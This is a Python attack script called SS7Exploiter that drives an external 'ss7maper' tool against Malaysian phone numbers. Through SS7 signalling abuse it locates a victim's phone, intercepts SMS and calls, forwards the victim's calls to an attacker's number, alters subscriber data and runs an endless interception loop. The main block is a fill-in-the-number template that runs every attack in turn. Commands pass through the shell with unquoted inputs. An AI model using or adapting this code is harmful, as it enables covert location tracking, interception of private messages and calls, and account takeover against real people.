import subprocess
import time
import re
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(filename='ss7exploiter.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class SS7Exploiter:
    def __init__(self, owner="H2", retryAttempts=3, monitoringInterval=60):
        self.owner = owner
        self.retryAttempts = retryAttempts
        self.monitoringInterval = monitoringInterval

    def IsValidMalaysianNumber(self, phoneNumber):
        """Check if the phone number is a valid Malaysian number."""
        pattern = r"^\+60[1-9]\d{8,9}$"  # Adjusted regex for Malaysian phone numbers
        return re.match(pattern, phoneNumber) is not None

    def LogOperation(self, operation, message):
        """Log operations with timestamps."""
        logging.info(f"[{self.owner}] {operation}: {message}")
        print(f"[{self.owner}] {operation}: {message}")

    def ExecuteCommand(self, command):
        """Execute a command in the shell and return the result."""
        for attempt in range(self.retryAttempts):
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout.strip()
            except Exception as e:
                self.LogOperation("Command Execution Error", str(e))
                if attempt < self.retryAttempts - 1:
                    time.sleep(2)  # Wait before retrying
        return None

    def LocatePhone(self, phoneNumber):
        """Locate a phone by sending a MAP_LocationRequest SS7 message."""
        if not self.IsValidMalaysianNumber(phoneNumber):
            self.LogOperation("Location Tracking", f"Invalid Malaysian phone number: {phoneNumber}.")
            return

        self.LogOperation("Location Tracking", f"Locating phone number: {phoneNumber}...")
        command = f"ss7maper locate --msisdn {phoneNumber}"
        result = self.ExecuteCommand(command)

        if "Location" in result:
            self.LogOperation("Location Found", f"Location of {phoneNumber}: {result}")
        else:
            self.LogOperation("Location Tracking", f"Could not locate {phoneNumber}.")

    def InterceptSMS(self, phoneNumber):
        """Intercept SMS messages by sending a MAP_SendRoutingInfoForSM SS7 message."""
        if not self.IsValidMalaysianNumber(phoneNumber):
            self.LogOperation("SMS Interception", f"Invalid Malaysian phone number: {phoneNumber}.")
            return

        self.LogOperation("SMS Interception", f"Intercepting SMS for {phoneNumber}...")
        command = f"ss7maper intercept --msisdn {phoneNumber} --sms"
        result = self.ExecuteCommand(command)

        if "Intercepted" in result:
            self.LogOperation("SMS Intercepted", f"SMS Intercepted for {phoneNumber}: {result}")
        else:
            self.LogOperation("SMS Interception", f"Failed to intercept SMS for {phoneNumber}.")

    def CallForwardingAttack(self, victimNumber, attackerNumber):
        """Perform a call forwarding attack by redirecting calls from the victim's number to the attacker's number."""
        if not self.IsValidMalaysianNumber(victimNumber) or not self.IsValidMalaysianNumber(attackerNumber):
            self.LogOperation("Call Forwarding", f"Invalid Malaysian phone numbers: {victimNumber}, {attackerNumber}.")
            return

        self.LogOperation("Call Forwarding", f"Setting up call forwarding for {victimNumber} to {attackerNumber}...")
        command = f"ss7maper call-forward --victim {victimNumber} --forward-to {attackerNumber}"
        result = self.ExecuteCommand(command)

        if "Forwarding Set" in result:
            self.LogOperation("Call Forwarding Successful", f"Calls to {victimNumber} will now be forwarded to {attackerNumber}.")
        else:
            self.LogOperation("Call Forwarding", f"Call forwarding attack failed for {victimNumber}.")

    def InterceptCall(self, phoneNumber):
        """Intercept calls by using an SS7 vulnerability that reroutes the calls to an attacker-controlled line."""
        if not self.IsValidMalaysianNumber(phoneNumber):
            self.LogOperation("Call Interception", f"Invalid Malaysian phone number: {phoneNumber}.")
            return

        self.LogOperation("Call Interception", f"Intercepting calls for {phoneNumber}...")
        command = f"ss7maper intercept --msisdn {phoneNumber} --call"
        result = self.ExecuteCommand(command)

        if "Intercepted" in result:
            self.LogOperation("Call Intercepted", f"Call Intercepted for {phoneNumber}: {result}")
        else:
            self.LogOperation("Call Interception", f"Failed to intercept calls for {phoneNumber}.")

    def ManipulateSubscriberData(self, phoneNumber, newData):
        """Manipulate the subscriber's data by sending a MAP_InsertSubscriberData SS7 message."""
        if not self.IsValidMalaysianNumber(phoneNumber):
            self.LogOperation("Data Manipulation", f"Invalid Malaysian phone number: {phoneNumber}.")
            return

        self.LogOperation("Data Manipulation", f"Manipulating subscriber data for {phoneNumber}...")
        command = f"ss7maper manipulate --msisdn {phoneNumber} --data {newData}"
        result = self.ExecuteCommand(command)

        if "Data Manipulated" in result:
            self.LogOperation("Data Manipulation Successful", f"Successfully manipulated data for {phoneNumber}. New Data: {newData}")
        else:
            self.LogOperation("Data Manipulation", f"Failed to manipulate data for {phoneNumber}.")

    def ContinuousMonitoring(self, phoneNumber):
        """Continuous monitoring and exploitation loop."""
        if not self.IsValidMalaysianNumber(phoneNumber):
            self.LogOperation("Continuous Monitoring", f"Invalid Malaysian phone number for monitoring: {phoneNumber}.")
            return

        self.LogOperation("Continuous Monitoring", f"Starting continuous monitoring for {phoneNumber}...")
        try:
            while True:
                self.InterceptSMS(phoneNumber)
                self.InterceptCall(phoneNumber)
                time.sleep(self.monitoringInterval)  # Repeat every monitoringInterval seconds
        except KeyboardInterrupt:
            self.LogOperation("Continuous Monitoring", "Stopping continuous monitoring.")

# EDIT HERE !
if __name__ == "__main__":
    victimNumber = " EDIT HERE "  # Sample Malaysian phone number
    attackerNumber = " EDIT HERE "  # Sample attacker phone number
    newSubscriberData = "You're my subscriber !"
    
    exploiter = SS7Exploiter()
    
    # Execute operations
    exploiter.LocatePhone(victimNumber)
    exploiter.InterceptSMS(victimNumber)
    exploiter.InterceptCall(victimNumber)
    exploiter.CallForwardingAttack(victimNumber, attackerNumber)
    exploiter.ManipulateSubscriberData(victimNumber, newSubscriberData)
    
    # Start continuous monitoring (optional)
    exploiter.ContinuousMonitoring(victimNumber)
